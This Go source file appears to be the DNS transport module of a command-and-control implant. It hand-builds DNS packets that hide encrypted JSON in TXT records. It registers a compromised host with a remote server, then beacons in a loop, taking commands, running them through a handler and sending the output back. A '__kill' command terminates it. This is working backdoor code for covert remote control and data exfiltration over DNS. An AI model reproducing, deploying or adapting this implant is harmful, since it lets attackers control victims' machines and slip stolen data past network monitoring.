//go:build transport_dns

package main

import (
	"encoding/binary"
	"fmt"
	"net"
	"time"
)

type ActiveTransport struct {
	host      string
	port      string
	encryptFn func(string) (string, error)
	decryptFn func(string) (string, error)
}

func NewActiveTransport(scheme, host, port, ua, regURI, ciURI, resURI string,
	encFn func(string) (string, error), decFn func(string) (string, error)) *ActiveTransport {
	return &ActiveTransport{host: host, port: port, encryptFn: encFn, decryptFn: decFn}
}

func txtPack(blob []byte) []byte {
	var out []byte
	for i := 0; i < len(blob); i += 255 {
		end := i + 255
		if end > len(blob) {
			end = len(blob)
		}
		chunk := blob[i:end]
		out = append(out, byte(len(chunk)))
		out = append(out, chunk...)
	}
	if len(out) == 0 {
		out = []byte{0}
	}
	return out
}

func txtUnpack(rdata []byte) []byte {
	var out []byte
	for i := 0; i < len(rdata); {
		n := int(rdata[i])
		i++
		if i+n > len(rdata) {
			break
		}
		out = append(out, rdata[i:i+n]...)
		i += n
	}
	return out
}

func dnsName(labels ...string) []byte {
	var out []byte
	for _, label := range labels {
		out = append(out, byte(len(label)))
		out = append(out, []byte(label)...)
	}
	return append(out, 0)
}

func (t *ActiveTransport) roundTrip(payload string) (string, error) {
	body := []byte(payload)
	txt := txtPack(body)
	pkt := make([]byte, 12)
	binary.BigEndian.PutUint16(pkt[0:2], 1)
	binary.BigEndian.PutUint16(pkt[2:4], 0x0100)
	binary.BigEndian.PutUint16(pkt[4:6], 1)
	binary.BigEndian.PutUint16(pkt[10:12], 1)
	pkt = append(pkt, dnsName("c2")...)
	q := make([]byte, 4)
	binary.BigEndian.PutUint16(q[0:2], 16)
	binary.BigEndian.PutUint16(q[2:4], 1)
	pkt = append(pkt, q...)
	pkt = append(pkt, dnsName("p")...)
	add := make([]byte, 10)
	binary.BigEndian.PutUint16(add[0:2], 16)
	binary.BigEndian.PutUint16(add[2:4], 1)
	binary.BigEndian.PutUint16(add[8:10], uint16(len(txt)))
	pkt = append(pkt, add...)
	pkt = append(pkt, txt...)
	conn, err := net.DialTimeout("udp", net.JoinHostPort(t.host, t.port), 8*time.Second)
	if err != nil {
		return "", err
	}
	defer conn.Close()
	conn.SetDeadline(time.Now().Add(8 * time.Second))
	if _, err = conn.Write(pkt); err != nil {
		return "", err
	}
	buf := make([]byte, 65535)
	n, err := conn.Read(buf)
	if err != nil {
		return "", err
	}
	resp := buf[:n]
	if len(resp) < 12 {
		return "", fmt.Errorf("short dns reply")
	}
	qd := int(binary.BigEndian.Uint16(resp[4:6]))
	an := int(binary.BigEndian.Uint16(resp[6:8]))
	off := 12
	for i := 0; i < qd; i++ {
		off = skipName(resp, off) + 4
	}
	for i := 0; i < an; i++ {
		off = skipName(resp, off)
		rtype := binary.BigEndian.Uint16(resp[off : off+2])
		rdlen := int(binary.BigEndian.Uint16(resp[off+8 : off+10]))
		rdata := resp[off+10 : off+10+rdlen]
		if rtype == 16 {
			return string(txtUnpack(rdata)), nil
		}
	}
	return "", fmt.Errorf("no txt answer")
}

func skipName(data []byte, off int) int {
	for off < len(data) {
		n := int(data[off])
		if n == 0 {
			return off + 1
		}
		if n&0xC0 == 0xC0 {
			return off + 2
		}
		off += 1 + n
	}
	return off
}

func (t *ActiveTransport) Register(metadata map[string]interface{}) (string, error) {
	msg := map[string]interface{}{"type": "register", "metadata": metadata}
	raw, _ := jsonMarshal(msg)
	enc, err := t.encryptFn(string(raw))
	if err != nil {
		return "", err
	}
	resp, err := t.roundTrip(enc)
	if err != nil {
		return "", err
	}
	dec, err := t.decryptFn(resp)
	if err != nil {
		return "", err
	}
	return parseID(dec)
}

func (t *ActiveTransport) Checkin(agentID string, results []map[string]interface{}) ([]map[string]interface{}, error) {
	if results == nil {
		results = []map[string]interface{}{}
	}
	mode := agentMode
	if mode == "" || mode == "{{AGENT_MODE}}" {
		mode = "beacon"
	}
	msg := map[string]interface{}{
		"type": "checkin", "agent_id": agentID,
		"metadata": map[string]interface{}{"mode": mode, "hostname": "dns-agent"},
		"results":  results,
	}
	raw, _ := jsonMarshal(msg)
	enc, err := t.encryptFn(string(raw))
	if err != nil {
		return nil, err
	}
	resp, err := t.roundTrip(enc)
	if err != nil {
		return nil, err
	}
	dec, err := t.decryptFn(resp)
	if err != nil {
		return nil, err
	}
	return parseCommands(dec)
}

func (t *ActiveTransport) SendResult(agentID, command, output string) error { return nil }
func (t *ActiveTransport) StartStreaming(agentID string, handler func(string) string) error {
	return t.beacon(agentID, handler)
}
func (t *ActiveTransport) Close() {}

func (t *ActiveTransport) beacon(agentID string, handler func(string) string) error {
	var pending []map[string]interface{}
	for {
		cmds, err := t.Checkin(agentID, pending)
		pending = nil
		if err != nil {
			time.Sleep(5 * time.Second)
			continue
		}
		if len(cmds) == 1 {
			if tp, _ := cmds[0]["type"].(string); tp == "reregister" {
				if id, _ := cmds[0]["agent_id"].(string); id != "" {
					agentID = id
				}
				continue
			}
		}
		for _, cmd := range cmds {
			command, _ := cmd["command"].(string)
			if command == "__kill" {
				return nil
			}
			if command == "" {
				continue
			}
			pending = append(pending, map[string]interface{}{
				"type": "response", "command": command, "output": handler(command),
			})
		}
		time.Sleep(1 * time.Second)
	}
}
